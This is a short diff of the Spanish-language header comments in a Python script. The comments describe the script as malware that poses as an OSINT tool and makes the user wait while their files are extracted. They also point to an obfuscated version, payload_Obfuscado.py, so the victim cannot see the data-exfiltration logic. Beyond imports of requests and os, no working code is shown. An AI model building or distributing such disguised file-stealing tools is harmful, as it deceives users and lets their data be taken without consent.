@@ -4,8 +4,7 @@
 #__________________________________________________________|
 #
 # El codigo cuenta con engaño para hacer esperar al usuario mientras se extraen los archivos simulando una Herramienta de OSINT
-# Si quieres que el usuario no mire el codigo y vea las logicas de filtracion de datos simplemente proba con la version OBFUSCADA en la carpeta : "Version2"
-
+# Si quieres que el usuario no mire el codigo y vea las logicas de filtracion de datos simplemente proba con la version OBFUSCADA en el archivo : payload_Obfuscado.py
 
 import requests
 import os
